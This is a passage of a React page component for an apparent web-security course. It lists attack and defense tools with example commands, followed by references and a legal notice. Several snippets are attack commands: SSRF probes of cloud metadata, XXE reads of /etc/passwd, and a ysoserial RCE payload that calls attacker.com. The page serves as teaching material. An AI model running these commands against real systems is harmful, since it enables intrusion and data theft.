        return 'Invalid or expired session', 403`}
                    </pre>
                  </div>
                </div>
              </div>
            </section>

            {/* Interactive Notebook Link */}
            <section className="bg-gradient-to-r from-indigo-500 to-purple-600 rounded-lg p-8 text-white">
              <h3 className="text-2xl font-bold mb-4">Interactive Jupyter Notebook</h3>
              <p className="mb-6">
                Explore additional hands-on labs including XXE injection, file upload bypasses, and comprehensive
                security header configurations. Practice exploiting vulnerabilities in controlled environments.
              </p>
              <Link
                to="/app/ide/19"
                className="inline-block px-6 py-3 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 rounded-lg font-semibold transition-all"
              >
                Open Interactive Lab Playground
              </Link>
            </section>
          </div>
        )}

        {activeTab === 'tools' && (
          <div className="space-y-8">
            <section>
              <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
                Exploitation and Defense Tools
              </h2>
            </section>

            {/* Attack Tools */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-red-600 dark:text-red-400 mb-6">
                Web Vulnerability Testing Tools
              </h3>

              <div className="grid md:grid-cols-2 gap-6">
                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Burp Suite Professional
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Industry-standard web application security testing platform. Comprehensive scanner for detecting
                    CSRF, SSRF, XXE, deserialization, and 100+ vulnerability types.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Key features:
- Active/passive scanning
- Intruder for fuzzing
- Repeater for manual testing
- Collaborator for SSRF/XXE
- Extensions marketplace`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    OWASP ZAP (Zed Attack Proxy)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Free, open-source web app security scanner. Excellent for finding CSRF, XSS, injection flaws,
                    and misconfigurations. Suitable for CI/CD integration.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Automated scan
zap-cli quick-scan --self-contained \\
  -s xss,sqli,pathtraversal \\
  https://target.com

# CI/CD integration
docker run -t owasp/zap2docker-stable \\
  zap-baseline.py -t https://target.com`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    SSRFmap
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Automatic SSRF fuzzer and exploitation tool. Tests for cloud metadata access, internal port
                    scanning, and protocol smuggling.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Test for AWS metadata SSRF
python3 ssrfmap.py -r request.txt \\
  -p url -m aws

# Port scan internal network
python3 ssrfmap.py -r request.txt \\
  -p url --portscan 192.168.1.1:1-1000`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    ysoserial
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Java deserialization exploit payload generator. Creates malicious serialized objects for
                    common Java libraries (Commons Collections, Spring, etc.).
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Generate RCE payload
java -jar ysoserial.jar \\
  CommonsCollections6 \\
  'curl http://attacker.com/pwned' | base64

# Test deserialization vulnerability
curl -X POST https://target.com/api \\
  -H "Cookie: session=<base64_payload>"`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    XXEinjector
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Automated XXE injection tool. Tests for file disclosure, SSRF, and denial of service via
                    XML external entity attacks.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Test for XXE file disclosure
ruby XXEinjector.rb --host=target.com \\
  --path=/api/upload --file=/etc/passwd \\
  --oob=http --phpfilter

# Test for SSRF via XXE
ruby XXEinjector.rb --host=target.com \\
  --path=/api/upload --ssrf --awsmetadata`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Nuclei
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Fast vulnerability scanner with 7,000+ templates. Detects misconfigurations, exposed panels,
                    CVEs, and common web vulnerabilities.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Scan for web vulnerabilities
nuclei -u https://target.com \\
  -tags csrf,ssrf,lfi,xxe

# Scan with severity filter
nuclei -l targets.txt -severity critical,high`}
                  </pre>
                </div>
              </div>
            </section>

            {/* Defense Tools */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-green-600 dark:text-green-400 mb-6">
                Web Application Defense Tools
              </h3>

              <div className="grid md:grid-cols-2 gap-6">
                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    ModSecurity WAF
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Open-source web application firewall. Provides virtual patching, OWASP Core Rule Set (CRS)
                    for blocking common attacks including injection, CSRF, and file inclusion.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Install with Apache
sudo apt install libapache2-mod-security2

# Enable OWASP CRS
cd /etc/modsecurity
git clone https://github.com/coreruleset/coreruleset
cp crs-setup.conf.example crs-setup.conf

# Configure paranoia level
SecAction "id:900000,phase:1,nolog,pass,\\
  t:none,setvar:tx.paranoia_level=2"`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Content Security Policy (CSP)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Browser security header that mitigates XSS, clickjacking, and code injection. Defines
                    trusted content sources and restricts inline scripts.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Strict CSP header (Express.js)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'"
  );
  next();
});`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    OWASP Dependency-Check
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Identifies project dependencies with known vulnerabilities (CVEs). Scans Java, .NET, Node.js,
                    Python, Ruby, and PHP dependencies.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Scan Node.js project
dependency-check.sh --project "MyApp" \\
  --scan ./package.json --out ./report

# Fail build on high severity
dependency-check.sh --project "MyApp" \\
  --scan . --failOnCVSS 7`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Snyk
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Developer-first security platform. Finds and fixes vulnerabilities in dependencies, containers,
                    and infrastructure-as-code. Provides automated fix PRs.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Scan for vulnerabilities
snyk test

# Monitor project continuously
snyk monitor

# Fix vulnerabilities automatically
snyk fix`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Security Headers Scanner
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Automated security header checker. Validates presence and configuration of HSTS, CSP,
                    X-Frame-Options, X-Content-Type-Options, and other security headers.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Check security headers
curl -I https://target.com

# Required headers:
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=()`}
                  </pre>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-3">
                    Semgrep
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Static analysis tool for finding bugs and security vulnerabilities. Language-agnostic with
                    rules for detecting SSRF, SQL injection, path traversal, and insecure deserialization.
                  </p>
                  <pre className="bg-gray-900 text-gray-100 p-3 rounded text-sm">
{`# Scan for security issues
semgrep --config=auto .

# Scan with OWASP Top 10 rules
semgrep --config "p/owasp-top-ten" .

# CI/CD integration
semgrep ci`}
                  </pre>
                </div>
              </div>
            </section>
          </div>
        )}

        {activeTab === 'references' && (
          <div className="space-y-8">
            <section>
              <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
                References and Resources
              </h2>
            </section>

            {/* Official Documentation */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                Official Standards and Documentation
              </h3>

              <div className="space-y-4">
                <div className="border-l-4 border-indigo-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    OWASP Top 10 Web Application Security Risks (2021)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    The de-facto standard awareness document for web application security. Covers broken access
                    control, cryptographic failures, injection, insecure design, and more.
                  </p>
                  <a
                    href="https://owasp.org/Top10/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-indigo-600 dark:text-indigo-400 hover:underline text-sm mt-2 inline-block"
                  >
                    https://owasp.org/Top10/
                  </a>
                </div>

                <div className="border-l-4 border-purple-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    OWASP Application Security Verification Standard (ASVS)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Comprehensive framework of security requirements for designing, developing, and testing secure
                    web applications. Three verification levels.
                  </p>
                  <a
                    href="https://owasp.org/www-project-application-security-verification-standard/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-purple-600 dark:text-purple-400 hover:underline text-sm mt-2 inline-block"
                  >
                    https://owasp.org/www-project-application-security-verification-standard/
                  </a>
                </div>

                <div className="border-l-4 border-pink-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    CWE Top 25 Most Dangerous Software Weaknesses
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Annually updated list of most critical security weaknesses. Includes CWE-79 (XSS), CWE-89
                    (SQLi), CWE-352 (CSRF), CWE-918 (SSRF).
                  </p>
                  <a
                    href="https://cwe.mitre.org/top25/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-pink-600 dark:text-pink-400 hover:underline text-sm mt-2 inline-block"
                  >
                    https://cwe.mitre.org/top25/
                  </a>
                </div>

                <div className="border-l-4 border-amber-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    PortSwigger Web Security Academy
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Free online training portal with interactive labs for SQL injection, CSRF, SSRF, XXE,
                    deserialization, and 20+ vulnerability classes.
                  </p>
                  <a
                    href="https://portswigger.net/web-security"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-amber-600 dark:text-amber-400 hover:underline text-sm mt-2 inline-block"
                  >
                    https://portswigger.net/web-security
                  </a>
                </div>
              </div>
            </section>

            {/* CWE References */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                Common Weakness Enumeration (CWE) References
              </h3>

              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-352: CSRF</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Cross-Site Request Forgery
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-918: SSRF</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Server-Side Request Forgery
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-502: Unsafe Deserialization</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Deserialization of Untrusted Data
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-611: XXE</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Improper Restriction of XML External Entity
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-22: Path Traversal</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Improper Limitation of a Pathname
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-434: File Upload</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Unrestricted Upload of Dangerous File Type
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-287: Broken Authentication</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Improper Authentication
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">CWE-16: Configuration</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Security Misconfiguration
                  </p>
                </div>
              </div>
            </section>

            {/* CVE Examples */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                Notable CVE Examples
              </h3>

              <div className="space-y-4">
                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    CVE-2021-44228 (Log4Shell) - CVSS 10.0
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                    Critical RCE via JNDI injection in Apache Log4j. Allowed unauthenticated remote code execution
                    through specially crafted log messages. Affected millions of applications worldwide.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    CVE-2017-5638 (Apache Struts 2) - CVSS 10.0
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                    RCE via Content-Type header. Used in Equifax breach affecting 147.9 million people. Allowed
                    execution of arbitrary commands through malformed Content-Type values.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    CVE-2019-0708 (BlueKeep) - CVSS 9.8
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                    Pre-authentication RCE in Windows Remote Desktop Services. Wormable vulnerability affecting
                    nearly 1 million internet-exposed systems. No user interaction required.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    CVE-2017-9805 (Apache Struts 2 REST Plugin) - CVSS 8.1
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                    XXE vulnerability via XStream deserialization. Allowed remote code execution through XML
                    payload submission. Also used in Equifax breach.
                  </p>
                </div>
              </div>
            </section>

            {/* Academic Papers & Research */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                Academic Research and Papers
              </h3>

              <div className="space-y-4">
                <div className="border-l-4 border-indigo-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    [1] "Protecting Browsers from Cross-Origin CSS Attacks"
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Huang, Lin-Shung, et al. (2010). ACM Conference on Computer and Communications Security.
                    Early research on CSRF defenses and Same-Origin Policy.
                  </p>
                </div>

                <div className="border-l-4 border-purple-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    [2] "All Your Clouds Are Belong to Us: SSRF in the Wild"
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Tsai, Tzung-Huei, et al. (2020). DefCon 28. Comprehensive analysis of SSRF vulnerabilities
                    in cloud environments including AWS, GCP, and Azure metadata services.
                  </p>
                </div>

                <div className="border-l-4 border-pink-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    [3] "Marshalling Pickles: How Deserializing Objects Can Ruin Your Day"
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Frohoff, Chris & Lawrence, Gabriel (2015). AppSecCali. Foundational research on Java
                    deserialization vulnerabilities, led to creation of ysoserial tool.
                  </p>
                </div>

                <div className="border-l-4 border-amber-500 pl-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white">
                    [4] "Content Security Policy: A Successful Mess Between Hardening and Mitigation"
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 text-sm mt-1">
                    Calzavara, Stefano, et al. (2016). IEEE Security & Privacy. Analysis of CSP effectiveness
                    and deployment challenges across top 1 million websites.
                  </p>
                </div>
              </div>
            </section>

            {/* Practice Platforms */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                Practice Platforms and Labs
              </h3>

              <div className="grid md:grid-cols-2 gap-4">
                <div className="border border-gray-200 dark:border-slate-800 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white mb-2">
                    OWASP WebGoat
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Deliberately insecure application designed to teach web security lessons. Covers CSRF, SSRF,
                    XXE, insecure deserialization, and more.
                  </p>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white mb-2">
                    Damn Vulnerable Web Application (DVWA)
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    PHP/MySQL vulnerable web application with multiple difficulty levels. Practice exploiting
                    common vulnerabilities in safe environment.
                  </p>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white mb-2">
                    HackTheBox Web Challenges
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Real-world style web application challenges. Features SSRF, deserialization, CSRF, and
                    complex multi-stage exploits.
                  </p>
                </div>

                <div className="border border-gray-200 dark:border-slate-800 rounded p-4">
                  <h4 className="font-semibold text-gray-900 dark:text-white mb-2">
                    PortSwigger Web Security Academy
                  </h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Free interactive labs for every major vulnerability type. Includes apprentice, practitioner,
                    and expert level challenges.
                  </p>
                </div>
              </div>
            </section>

            {/* Legal and Ethical Notice */}
            <section className="bg-red-500/10 border border-red-500/50 rounded-lg p-6">
              <h3 className="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
                <AlertTriangle className="w-6 h-6 mr-2" />
                Legal and Ethical Guidelines
              </h3>
              <div className="space-y-2 text-sm text-gray-700 dark:text-gray-300">
                <p>
                  <strong>CRITICAL:</strong> Only test web vulnerabilities on systems you own or have explicit
                  written authorization to test.
                </p>
                <p>
                  <strong>Unauthorized testing is illegal</strong> under Computer Fraud and Abuse Act (CFAA)
                  18 USC § 1030 (US), Computer Misuse Act 1990 (UK), and similar laws worldwide.
                </p>
                <p>
                  <strong>Penalties include:</strong> Criminal prosecution, fines up to $500,000, imprisonment
                  up to 20 years, civil lawsuits, and permanent criminal record.
                </p>
                <p>
                  <strong>Use legal platforms:</strong> Bug bounty programs (HackerOne, Bugcrowd), practice labs
                  (DVWA, WebGoat), or your own isolated test environments.
                </p>
                <p>
                  <strong>Remember:</strong> "I was just testing" is not a legal defense. Always obtain written
                  permission and document scope of testing.
                </p>
              </div>
            </section>
          </div>
        )}
      </div>

      {/* Challenge Button */}
      
    </div>
  );
};
